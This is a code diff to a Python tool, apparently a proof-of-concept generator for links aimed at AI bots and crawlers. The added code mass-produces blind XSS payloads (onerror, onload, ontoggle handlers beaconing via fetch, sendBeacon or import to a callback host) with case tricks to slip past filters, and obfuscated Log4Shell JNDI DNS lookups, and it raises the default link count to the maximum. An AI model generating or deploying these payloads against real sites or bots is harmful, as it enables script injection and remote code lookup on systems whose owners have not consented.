@@ -50,22 +50,87 @@ def _callback_host(callback: str) -> str:
     return urlsplit(_callback_url(callback)).hostname or ""
 
 
+def _fanout_payload(kind: str, n: int, token: str) -> str:
+    prefixes = {
+        "marker": ("marker", "trace", "probe", "request", "crawler", "visit",
+                   "link", "item", "resource", "poc"),
+        "cache-bust": ("cb", "nocache", "fresh", "bypass", "unique", "version",
+                       "cache", "miss", "nonce", "buster"),
+    }[kind]
+    separators = ("-", ".", "_", "~", "!", "$", ":", "/", ",", ";")
+    index = n - 1
+    prefix = prefixes[index % 10]
+    separator = separators[(index // 10) % 10]
+    shape = (index // 100) % 10
+    number = (str(n), f"{n:04d}", f"{n:x}", f"{n:o}", f"{n:b}")[shape % 5]
+    layouts = (
+        (prefix, token, number), (token, prefix, number),
+        (prefix, number, token), (number, prefix, token),
+        (prefix + token, number), (prefix, token + number),
+        (token, number, prefix), (number, token, prefix),
+        (prefix + number, token), (token, prefix + number),
+    )
+    return separator.join(layouts[shape])
+
+
+def _blind_xss_payload(n: int, beacon: str) -> str:
+    prefixes = ('">', "'>", "</title>", "</textarea>", "</script>")
+    elements = (
+        ('<img src=x {event}="this.onerror=null;{js}">', "onerror"),
+        ('<svg {event}="{js}">', "onload"),
+        ('<details open {event}="{js}">', "ontoggle"),
+        ('<video src=x {event}="this.onerror=null;{js}">', "onerror"),
+        ('<input autofocus {event}="{js}">', "onfocus"),
+    )
+    beacons = (
+        "fetch('{beacon}',{mode:'no-cors'})",
+        "(new Image).src='{beacon}'",
+        "navigator.sendBeacon('{beacon}')",
+        "location.assign('{beacon}')",
+        "import('{beacon}')",
+    )
+    index = n - 1
+    prefix = prefixes[index % 5]
+    element, event = elements[(index // 5) % 5]
+    javascript = beacons[(index // 25) % 5].replace("{beacon}", beacon)
+    case_mask = (index // 125) % 8
+    event = "".join(
+        char.upper() if position < 3 and case_mask & (1 << position) else char
+        for position, char in enumerate(event)
+    )
+    return prefix + element.replace("{event}", event).replace("{js}", javascript)
+
+
+def _obfuscated_word(word: str, index: int) -> tuple[str, int]:
+    pieces = []
+    for char in word:
+        forms = (char, "${lower:" + char.upper() + "}", "${::-" + char + "}")
+        pieces.append(forms[index % 3])
+        index //= 3
+    return "".join(pieces), index
+
+
+def _log4j_dns_payload(n: int, token: str, callback: str) -> str:
+    index = n - 1
+    jndi, index = _obfuscated_word("jndi", index)
+    dns, _ = _obfuscated_word("dns", index)
+    path = f"ai-bot-poc-{quote(token, safe='')}-{n}"
+    return "${" + jndi + ":" + dns + "://" + _callback_host(callback) + "/" + path + "}"
+
+
 def make_payload(kind: str, *, n: int, target: str, token: str,
                  callback: str, custom: str | None) -> str:
-    if kind == "marker":
-        return f"ai-bot-poc-{token}-{n}"
-    if kind == "cache-bust":
-        return f"cb-{token}-{n}"
+    if kind in ("marker", "cache-bust"):
+        return _fanout_payload(kind, n, token)
     if kind == "blind-xss":
         if not callback:
             raise ValueError("blind-xss requires --callback")
         beacon = f"{_callback_url(callback)}/ai-bot-poc/{quote(token, safe='')}/{n}"
-        return (f'''"><img src=x onerror="this.onerror=null;'''
-                f'''fetch('{beacon}',{{mode:'no-cors'}})">''')
+        return _blind_xss_payload(n, beacon)
     if kind == "log4j-dns":
         if not callback:
             raise ValueError("log4j-dns requires --callback")
-        return "${jndi:dns://" + _callback_host(callback) + f"/ai-bot-poc-{token}-{n}" + "}"
+        return _log4j_dns_payload(n, token, callback)
     if not custom:
         raise ValueError("custom payload requires --payload-template")
     return (custom.replace("{n}", str(n))
@@ -130,8 +195,8 @@ def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
     parser.add_argument("targets", nargs="*", help="Base target URL(s)")
     parser.add_argument("--targets-file", type=Path,
                         help="File containing one target URL per line")
-    parser.add_argument("--count", type=int, default=10,
-                        help=f"Number of links, 1-{MAX_LINKS} (default: 10)")
+    parser.add_argument("--count", type=int, default=MAX_LINKS,
+                        help=f"Number of links, 1-{MAX_LINKS} (default: {MAX_LINKS})")
     parser.add_argument("--text", action="append", default=[],
                         help="Link text or increment template; repeat for a list")
     parser.add_argument("--text-file", type=Path,
